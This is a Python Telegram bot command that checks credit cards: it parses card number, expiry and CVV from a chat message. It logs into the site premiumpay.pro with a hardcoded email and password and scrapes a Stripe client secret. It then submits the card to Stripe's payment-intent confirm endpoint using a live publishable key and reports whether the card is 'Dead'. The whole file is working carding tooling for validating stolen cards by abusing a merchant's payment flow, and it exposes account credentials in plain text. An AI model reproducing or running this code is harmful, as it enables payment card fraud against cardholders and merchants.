import requests as req
from urllib.parse import quote as quote

session = req.Session()


def getStr(text:str, a:str, b:str) -> str:
    return text.split(a)[1].split(b)[0]


async def getLive(update, extra, ParseMode, ChatAction):
    await update.message.reply_chat_action(ChatAction.TYPING)
    try:
        extra = extra.args[0] if update.message.reply_to_message == None else update.message.reply_to_message.text 
        extra = extra.replace(":", "|").replace("/", "|").replace(" ", "|")
        card_details = extra.split("|")
        card = card_details[0]
        month = card_details[1]
        year = card_details[2]
        cvv = card_details[3]

        
        msg = await update.message.reply_text(f"checking card\n→ card: {card}:{month}:{year}:{cvv}\n▲ ▱▱▱▱▱▱▱▱▱▱ 0%", reply_to_message_id=update.message.message_id, parse_mode=ParseMode)
 

        # =============== Req Login =========
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://premiumpay.pro',
            'Connection': 'keep-alive',
            'Referer': 'https://premiumpay.pro/logout',
        }

        data = 'testigo=1&next=&idpasarela=&idProducto=&email=paracodear21%40gmail.com&password=T1%40eeKkGDkh*Gg0c'

        login = session.post('https://premiumpay.pro/loogin', headers=headers, data=data)

        await msg.edit_text("▲ ▰▰▰▰▰▰▱▱▱▱ 60%", parse_mode=ParseMode.HTML)



        # ========= Req payment_method ===============

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Referer': 'https://premiumpay.pro/user_compras',
        }

        payment_method = session.get('https://premiumpay.pro/user_metodos', headers=headers)


        # =========== Req Token ==================

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Referer': 'https://premiumpay.pro/user_metodos',
        }

        token = session.get('https://premiumpay.pro/stripe_tokenizar', headers=headers)
        client_secret = getStr(token.text, "clientSecret: '", "',") # -> Get clientSEcret
        return_url = quote(getStr(token.text, "return_url: '", "',")) # -> Return URL once connect the client_secret
        pi = client_secret.split("_secret_")[0] # -> Only get the pi token



        #======= req confirm stripe ======= 
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://js.stripe.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Connection': 'keep-alive',
        }


        data = f'return_url={return_url}&payment_method_data[type]=card&payment_method_data[card][number]={card}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={year}&payment_method_data[card][exp_month]={month}&payment_method_data[billing_details][address][country]=SV&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fc68765f93f%3B+stripe-js-v3%2Fc68765f93f%3B+payment-element&payment_method_data[time_on_page]=26543&payment_method_data[guid]=c6fe0734-0d9b-445b-9017-dd95b8cc9ea7f97c4a&payment_method_data[muid]=3e7d6554-53ce-4448-bc4c-e9c12b30bbdd7fb08b&payment_method_data[sid]=6f334855-3630-4b72-8521-57d07bf67ef8500ead&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51LURGILddfhx6CmMqhu7iENSYycvUIkfO3IXkC8zrSzVjJD2TNAlFUD2GKUkPatufDKpoBQkE8b88bfDrDgUquE200uXWUtHMV&client_secret={client_secret}'


        stripe = session.post(
            f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
            headers=headers,
            data=data,).json()

        await msg.edit_text("▲ ▰▰▰▰▰▰▰▰▰▰ 100%", parse_mode=ParseMode.HTML)


        await msg.edit_text(f"<b>CC</b>: <code>{card}|{month}|{year}|{cvv}</code>\n<b>Status</b>: Dead ❌.\n<b>Response</b>: {stripe['error']['message']}", parse_mode=ParseMode)


    except:
        await msg.edit_text(f"<b>CC</b>: <code>{card}|{month}|{year}|{cvv}</code>\n<b>Status</b>: Dead ❌.\n<b>Response</b>: 3D", parse_mode=ParseMode.HTML)


# ================= you can see requests by requests in a page ===========
#with open("pagina.html", "w", encoding="utf-8") as f:
#    f.write(response.text)

